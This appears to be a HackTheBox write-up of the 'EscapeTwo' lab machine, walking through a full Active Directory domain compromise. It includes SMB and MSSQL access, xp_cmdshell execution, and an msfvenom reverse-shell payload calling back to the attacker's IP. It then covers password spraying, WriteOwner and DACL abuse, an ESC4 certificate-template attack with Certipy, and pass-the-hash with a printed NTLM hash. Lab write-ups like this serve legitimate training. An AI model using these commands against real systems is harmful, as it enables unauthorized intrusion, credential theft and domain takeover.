---
title: "EscapeTwo"
date: 2026-02-22T00:00:00
draft: false
sources: "HackTheBox"
difficulties: "Easy"
tags: ["Windows", "Active Directory", "User Enumeration", "ADCS", "ESC4", "SMB Enumeration", "Certipy"]
author: "Anx"
description: "EscapeTwo is an easy difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. We leverage these credentials to access a file share containing a corrupted Excel document. By modifying its byte structure, we extract credentials. These are then sprayed across the domain, revealing valid credentials for a user with access to MSSQL, granting us initial access. System enumeration reveals SQL credentials, which are sprayed to obtain WinRM access. Further domain analysis shows the user has write owner rights over an account managing ADCS. This is used to enumerate ADCS, revealing a misconfiguration in Active Directory Certificate Services. Exploiting this misconfiguration allows us to retrieve the Administrator account hash, ultimately leading to complete domain compromise."
---

![](HackTheBox/Machines/Easy/EscapeTwo/featured.png)

## Provided Credentials

As is common in real-world Windows penetration tests, the engagement started with valid domain credentials:

| Username | Password     |
| -------- | ------------ |
| rose     | KxEPkKe6R8su |

## Enumeration
### Nmap

An initial TCP scan was performed using Nmap to identify exposed services on the target host.

```
sudo nmap -sVC 10.129.232.128 -oA nmap/10.129.232.128-tcp

Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 14:37 CET
Nmap scan report for 10.129.232.128
Host is up (0.056s latency).
Not shown: 991 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-02-21T13:38:39+00:00; 0s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2026-02-21T13:38:39+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.2.1:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.2.1:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-21T13:36:02
|_Not valid after:  2056-02-21T13:36:02
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-02-21T13:38:39+00:00; 0s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-02-21T13:38:39+00:00; 0s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-21T13:38:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.86 seconds
```

The scan results clearly indicated that the target was a Windows Domain Controller, as evidenced by the presence of LDAP (636), SMB (445), and Active Directory Global Catalog ports (3268/3269).

Additionally, the SSL certificates revealed the domain name `sequel.htb` and confirmed that the host was `DC01.sequel.htb`.

To ensure proper name resolution during subsequent interactions, the domain name was added to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

![](Pasted%20image%2020260222110219.png)

### SMB Shares

SMB shares were enumerated using the provided credentials.

```bash
nxc smb sequel.htb -u "rose" -p "KxEPkKe6R8su" --shares
```

![](Pasted%20image%2020260222110355.png)

A share named `Accounting Department` was found to be readable. Access was obtained using:

```bash
smbclient //sequel.htb/Accounting\ Department -U "rose%KxEPkKe6R8su"
```

![](Pasted%20image%2020260222114003.png)

Two Microsoft Excel files were identified and downloaded for offline analysis. Initially, the files appeared corrupted. However, Microsoft Excel’s **Open and Repair** functionality was used to recover their contents.

![](Pasted%20image%2020260222120255.png)

The file `accounts.xlsx` contained clear text credentials for four users.

![](Pasted%20image%2020260222120350.png)

After performing password spraying against exposed services, the `sa` account was found to be valid for the MSSQL service.

```bash
nxc mssql sequel.htb -u "sa" -p "<password>" --local-auth
```

Access was obtained using Impacket’s `mssqlclient`:

```bash
impacket-mssqlclient sa@sequel.htb
```

![](Pasted%20image%2020260222121157.png)

After authentication, `xp_cmdshell` was enabled:

```bash
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;

## Test
EXEC xp_cmdshell "net user";
```

![](Pasted%20image%2020260222121826.png)

Since `xp_cmdshell` was automatically disabled after execution, commands were executed inline:

```bash
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell "net user";
```

## FootHold

To obtain a reverse shell, a payload was generated using Msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.219 LPORT=4444 -f exe > anx.exe
```

![](Pasted%20image%2020260222123400.png)

The payload was then uploaded to the server:

```bash
nxc mssql sequel.htb -u "sa" -p "MSSQLP@ssw0rd\!" --local-auth --put-file anx.exe "C:\Users\sql_svc\Documents\anx.exe"
```

![](Pasted%20image%2020260222123113.png)

File upload was verified:

```bash
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell "dir C:\Users\sql_svc\Documents";
```

![](Pasted%20image%2020260222123159.png)

A listener was started on the attacking machine:

```bash
rlwrap nc -lvnp 4444
```

The payload was executed via SQL:

```bash
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell "C:\Users\sql_svc\Documents\anx.exe";
```

![](Pasted%20image%2020260222123306.png)

A reverse shell was successfully received as sql_svc.

![](Pasted%20image%2020260222123322.png)

### Credentials for domain sql_svc

The configuration files of the server were examined and credentials for the domain account `sql_svc`  user were found on `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI`.

![](Pasted%20image%2020260222123849.png)
## Privilege Escalation
### From sql_svc to ryan

Usernames were enumerated to generate a wordlist and a password spraying attack was performed to find credential reuse:

```bash
nxc smb sequel.htb -u Enumeration/users.txt -p "<password>"
```

![](Pasted%20image%2020260222124240.png)

It was discovered that the user `ryan` reused the same password and had WinRM access.

```bash
evil-winrm -u 'ryan' -p '<password>' -i sequel.htb
```

![](Pasted%20image%2020260222124358.png)

### From ryan to ca_svc

All the domain information was extracted and indexed into BloodHound to find privilege escalation vectors:

```bash
nxc ldap sequel.htb -d retro2.vl -u 'ryan' -p '<password>' --bloodhound --dns-server 10.129.232.128 -c All
```

![](Pasted%20image%2020260222124752.png)

User `ryan` possessed the `WriteOwner` permission over the user account `ca_svc`, which was a member of the `Cert Publishers` group. Based on this misconfiguration, the technique described in the following article was used to abuse these privileges and gain control of the `ca_svc` account:

- [https://www.hackingarticles.in/abusing-ad-dacl-writeowner/](https://www.hackingarticles.in/abusing-ad-dacl-writeowner/)

As described in the referenced blog:

> “Attackers can exploit the WriteOwner permission when they gain control of an object that has this privilege over another directory object. This allows them to grant ownership, then assign full control, and ultimately perform attacks like Kerberoasting or a password change without knowing the victim’s current credentials.”

In this scenario, a password change attack was performed. The Impacket toolkit was used to carry out the attack. First, the `owneredit` tool was executed to modify the ownership of the `ca_svc` account, assigning it to `ryan`.

```bash
impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=Users,DC=sequel,DC=htb' 'sequel.htb'/'ryan':'<password>' -dc-ip 10.129.232.128
```

![](Pasted%20image%2020260223232615.png)

Using the `owneredit` utility, the ownership of the `ca_svc` user object was successfully modified. As a result, the `ryan` account became the owner of the `ca_svc` object.

Next, the `dacledit` tool was executed to modify the object’s DACL and grant `ryan` full control over the `ca_svc` user object.

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=Users,DC=sequel,DC=htb' 'sequel.htb'/'ryan':'<password>' -dc-ip 10.129.232.128
```

![](Pasted%20image%2020260223233008.png)

The password of `ca_svc` was changed using bloodyAD.

```bash
bloodyAD --host "10.129.232.128" -d "sequel.htb" -u "ryan" -p "<password>" set password "ca_svc" "Password@987"
```

![](Pasted%20image%2020260222130111.png)

### From ca_svc to Administrator (AD CS)
#### AD CS Enumeration

After control of the CA service account was obtained, certificate templates were enumerated using `Certipy` to identify potential misconfigurations.

```bash
certipy-ad find -u ca_svc@10.129.232.128 -p "Password@987" -dc-ip "10.129.232.128" -vulnerable
```

The `-vulnerable` flag was used to filter and display only templates that were susceptible to known Active Directory Certificate Services (AD CS) abuse techniques.

![](Pasted%20image%2020260222130734.png)

![](Pasted%20image%2020260222131346.png)

The results showed that the `ca_svc` account had excessive permissions over the `DunderMifflinAuthentication` certificate template. These permissions enabled exploitation via an ESC4 attack.
#### Exploiting AD CS

The following reference was used as guidance for Active Directory Certificate Services (AD CS) abuse techniques. In this case, the ESC4 attack path was followed:

- [https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-templates-esc4](https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-templates-esc4)

First, the original template configuration was saved, and the `DunderMifflinAuthentication` certificate template was modified to introduce a vulnerable configuration.

```bash
certipy-ad template -u ca_svc@10.129.232.128 -p "Password@987" -dc-ip "10.129.232.128" -template "DunderMifflinAuthentication" -write-default-configuration
```

![](Pasted%20image%2020260222190840.png)

Next, a certificate was requested using the modified template. A custom Subject Alternative Name (SAN) was specified to impersonate the domain administrator account.

```bash
certipy-ad req -u ca_svc@10.129.232.128 -p "Password@987" -dc-ip "10.129.232.128" -target "dc01.sequel.htb" -ca "sequel-DC01-CA" -template "DunderMifflinAuthentication" -upn "Administrator@sequel.htb"
```

![](Pasted%20image%2020260222191844.png)

The issued certificate was then used for authentication, resulting in the extraction of the NTLM hash of the domain `Administrator` account.

```bash
certipy-ad auth -pfx administrator.pfx -username Administrator -domain sequel.htb -dc-ip 10.129.232.128
```

![](Pasted%20image%2020260222191912.png)

After successful exploitation, the original template configuration was restored to its previous state.

```bash
certipy-ad template -u ca_svc@10.129.232.128 -p "Password@987" -dc-ip "10.129.232.128" -template "DunderMifflinAuthentication" -write-configuration "DunderMifflinAuthentication.json" -no-save
```

Finally, the server was accessed via WinRM using a Pass-the-Hash technique with the obtained `Administrator` NTLM hash.

```
evil-winrm -u 'Administrator' -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i sequel.htb
```

![](Pasted%20image%2020260222192113.png)